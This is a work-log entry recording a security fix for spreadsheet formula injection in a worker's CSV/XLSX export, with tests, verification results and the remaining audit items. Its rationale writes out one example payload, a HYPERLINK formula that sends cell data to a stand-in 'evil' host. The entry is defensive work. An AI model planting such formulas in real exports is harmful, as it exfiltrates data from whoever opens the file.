## 2026-07-10 — Security audit finding #2: CSV/XLSX formula injection

### Done

- `apps/worker/src/export-worker.ts`: added `sanitizeSpreadsheetCell` — a cell
  starting with `=`, `+`, `-`, `@`, tab, or CR gets a leading `'` prepended (the
  standard force-text mitigation for CSV/XLSX formula injection). Applied to both
  headers and row cells in `renderCsv` and `renderXlsx` (now both exported for
  testability); `renderExportPdf` is untouched since PDF cells are drawn as plain
  text via `pdfkit`, no formula engine involved (confirmed clean by the 2026-07-09
  audit).
- `apps/worker/src/export-worker.test.ts` (new): 9 tests — proves a
  `=HYPERLINK(...)`-style payload is neutralized in both CSV output (raw string
  check) and XLSX output (round-tripped through a real `ExcelJS.Workbook.load`,
  asserting the cell value is stored as escaped text rather than a formula), plus
  header-cell and ordinary-value pass-through cases.

### Why

Second item from the 2026-07-09 security audit's to-do list. `buildExportRow`
(`@platform/entity-engine`) puts raw tenant-controlled custom-field values (e.g. a
ticket's subject/notes field) straight into export rows with no sanitization.
Exploit: a tenant user sets a field to `=HYPERLINK("http://evil/leak?d="&A1,"x")`;
when an admin exports and opens the file in Excel/LibreOffice, the formula executes
on the admin's machine — data exfiltration or DDE code execution.

### Known tradeoff (accepted, documented in code)

A legitimate value starting with `-` or `+` (e.g. a negative number rendered as a
string) also gets force-texted in Excel. This is the same blanket mitigation used
elsewhere (GitHub/GitLab CSV export) — correctness of a cosmetic number format is
secondary to not executing attacker-controlled formulas.

### Verification

- pnpm typecheck: PASS (41/41)
- pnpm lint: PASS (turbo's lint task doesn't invoke real eslint for apps/api or
  apps/worker — ran `npx eslint` directly on touched files as well, clean)
- pnpm test: PASS — `@platform/worker` 43/43 (up from 34, +9 new). Root `@platform/api`
  failures unchanged at 12 (the established baseline after the 2026-07-10 get.test.ts
  fixes) — this change doesn't touch apps/api at all.
- pnpm test:isolation: PASS (119/119, cache-hit — this change is outside its
  dependency graph, confirmed correct not stale)

### Next

Remaining items from the 2026-07-09 security audit's to-do list, in order:
1. **#3** `ZITADEL_AUDIENCE` should be required, not silently skipped when unset.
2. **#4** Zitadel error-body logging on failure paths (`zitadel-management.ts`).
3. **#5** Tenant-status cache cross-instance invalidation.
4. **#6/#7** Defense-in-depth: `automation-rules` routes via `withTenantContext`;
   `entity-types` mutation statements missing a belt-and-suspenders tenant filter.
5. **#8/#9/#10** Introspection cache hash, `users.ts` PII-exposure design
   confirmation, follow-up audit pass on ~90 unreviewed route files.

### Open questions

- None blocking.
